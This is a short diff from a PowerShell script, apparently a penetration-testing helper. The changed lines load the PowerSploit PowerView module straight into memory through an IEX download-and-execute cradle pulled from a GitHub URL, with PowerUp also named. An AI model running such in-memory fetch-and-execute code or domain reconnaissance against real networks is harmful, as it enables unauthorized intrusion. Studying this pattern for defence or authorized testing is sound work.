@@ -78,7 +78,8 @@ Write-Host "Importing powerview and powerup modules"
 if (-not (Get-Help Get-DomainUser)) {
     Write-Output "PowerView module not found, downloading into memory..."
     try {
-        $pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
+        $pwContent = IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1')
+        #$pwContent = Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1' -UseBasicParsing
         $pwContent
         #$pwContent.Content 
         Write-Output "PowerView loaded successfully"
